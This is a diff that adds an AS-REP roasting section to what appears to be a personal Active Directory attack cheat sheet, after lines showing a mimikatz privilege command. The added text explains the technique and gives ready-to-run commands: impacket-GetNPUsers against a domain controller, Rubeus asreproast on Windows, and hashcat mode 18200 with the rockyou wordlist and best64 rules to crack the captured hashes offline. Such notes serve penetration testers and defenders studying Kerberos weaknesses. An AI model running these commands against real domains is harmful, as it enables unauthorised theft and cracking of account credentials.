@@ -541,3 +541,15 @@ token::list
 token::elevate 
 
 ----
+
+##AS-REP roasting
+#By default Kerberos pre-auth is enabled on all accounts, but can be manually disabled for instace due to some sw/tech requirements, and if we would happen to stumble
+#upon an account or accounts with pre-auth disabled we can send a AS-REQ and gain AS-REP containing the session key and TGT and hence conduct an offline attack against
+#the encrypted part of AS-REP. This can be achieved with for example impacket-GetNPUsers in Linux (https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)
+Example: impacket-GetNPUsers -dc-ip 192.168.20.34  -request -outputfile roast.hashes testad.local/username
+
+#On a Windows host getting the hash can be done as a pre-authenticated user on the target with Rubeus (https://github.com/GhostPack/Rubeus)
+.\Rubeus.exe asreproast /nowrap
+
+#Previous would get us the hash and in order to do a password attack, we can use HashCat as the output is already in a compliant format:
+sudo hashcat -m 18200 roast.hashes /home/user/tools/wordlists/rockyou.txt -r /home/user/tools/hashcat/rules/best64.rule --force
